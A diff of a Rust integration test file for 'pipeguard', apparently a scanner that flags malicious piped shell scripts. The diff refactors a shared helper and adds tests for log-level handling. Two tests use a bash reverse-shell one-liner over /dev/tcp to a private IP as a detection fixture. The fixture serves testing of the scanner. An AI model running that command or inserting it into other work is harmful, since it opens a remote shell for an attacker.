@@ -1,11 +1,8 @@
-use assert_cmd::Command;
-use predicates::prelude::*;
-use tempfile::TempDir;
-use std::fs;
+mod common;
 
-fn pipeguard_cmd() -> Command {
-    Command::cargo_bin("pipeguard").unwrap()
-}
+use predicates::prelude::*;
+use std::fs;
+use tempfile::TempDir;
 
 fn create_test_rule_file(dir: &TempDir) -> std::path::PathBuf {
     let rule = r#"
@@ -27,7 +24,7 @@ fn create_test_rule_file(dir: &TempDir) -> std::path::PathBuf {
 
 #[test]
 fn cli_shows_help() {
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("--help")
         .assert()
         .success()
@@ -37,7 +34,7 @@ fn cli_shows_help() {
 
 #[test]
 fn cli_shows_version() {
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("--version")
         .assert()
         .success()
@@ -49,13 +46,13 @@ fn cli_scan_detects_malicious_stdin() {
     let temp_dir = TempDir::new().unwrap();
     let rule_path = create_test_rule_file(&temp_dir);
 
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("scan")
         .arg("--rules")
         .arg(&rule_path)
         .write_stdin("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
         .assert()
-        .failure()  // Non-zero exit for threats
+        .failure() // Non-zero exit for threats
         .stdout(predicate::str::contains("High"))
         .stdout(predicate::str::contains("reverse_shell"));
 }
@@ -65,7 +62,7 @@ fn cli_scan_allows_clean_stdin() {
     let temp_dir = TempDir::new().unwrap();
     let rule_path = create_test_rule_file(&temp_dir);
 
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("scan")
         .arg("--rules")
         .arg(&rule_path)
@@ -83,7 +80,7 @@ fn cli_scan_reads_from_file() {
     let script_path = temp_dir.path().join("script.sh");
     fs::write(&script_path, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").unwrap();
 
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("scan")
         .arg("--rules")
         .arg(&rule_path)
@@ -99,7 +96,7 @@ fn cli_scan_json_output() {
     let temp_dir = TempDir::new().unwrap();
     let rule_path = create_test_rule_file(&temp_dir);
 
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("scan")
         .arg("--rules")
         .arg(&rule_path)
@@ -114,7 +111,7 @@ fn cli_scan_json_output() {
 
 #[test]
 fn cli_install_shell_integration() {
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("install")
         .arg("--dry-run")
         .assert()
@@ -128,7 +125,7 @@ fn cli_config_init_creates_default() {
     let temp_dir = TempDir::new().unwrap();
     let config_path = temp_dir.path().join("config.toml");
 
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("config")
         .arg("init")
         .arg("--path")
@@ -143,10 +140,92 @@ fn cli_config_init_creates_default() {
 
 #[test]
 fn cli_rules_list_shows_builtin() {
-    pipeguard_cmd()
+    common::pipeguard_cmd()
         .arg("rules")
         .arg("list")
         .assert()
         .success()
         .stdout(predicate::str::contains("reverse_shell").or(predicate::str::contains("No rules")));
+}
+
+#[test]
+fn cli_log_level_flag_accepted() {
+    common::pipeguard_cmd()
+        .arg("--log-level")
+        .arg("debug")
+        .arg("rules")
+        .arg("list")
+        .assert()
+        .success();
+}
+
+#[test]
+fn cli_log_level_invalid_rejected() {
+    common::pipeguard_cmd()
+        .arg("--log-level")
+        .arg("verbose")
+        .arg("rules")
+        .arg("list")
+        .assert()
+        .failure()
+        .stderr(predicate::str::contains("possible values"));
+}
+
+#[test]
+fn cli_debug_logging_shows_on_stderr_not_stdout() {
+    let temp_dir = TempDir::new().unwrap();
+    let rule_path = create_test_rule_file(&temp_dir);
+
+    let output = common::pipeguard_cmd()
+        .arg("--log-level")
+        .arg("debug")
+        .arg("scan")
+        .arg("--rules")
+        .arg(&rule_path)
+        .write_stdin("echo 'Hello, World!'")
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(
+        stdout.contains("No threats"),
+        "stdout should contain scan results, got: {}",
+        stdout
+    );
+    assert!(
+        !stdout.contains("DEBUG") && !stdout.contains("WARN"),
+        "stdout should not contain tracing output, got: {}",
+        stdout
+    );
+
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        !stderr.is_empty(),
+        "stderr should contain debug logging output, but was empty"
+    );
+}
+
+#[test]
+fn default_log_level_produces_no_stderr_noise() {
+    let temp_dir = TempDir::new().unwrap();
+    let rule_path = create_test_rule_file(&temp_dir);
+
+    let output = common::pipeguard_cmd()
+        .arg("scan")
+        .arg("--rules")
+        .arg(&rule_path)
+        .write_stdin("echo 'Hello, World!'")
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        stderr.is_empty(),
+        "At default warn level, stderr should be empty for a clean scan, but got: {}",
+        stderr
+    );
 }
